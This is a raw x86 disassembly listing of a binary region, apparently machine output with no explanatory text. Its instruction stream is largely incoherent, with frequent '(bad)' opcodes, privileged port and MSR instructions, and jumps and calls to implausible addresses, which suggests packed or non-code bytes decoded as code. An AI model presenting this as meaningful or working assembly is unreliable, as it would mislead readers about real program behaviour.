  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
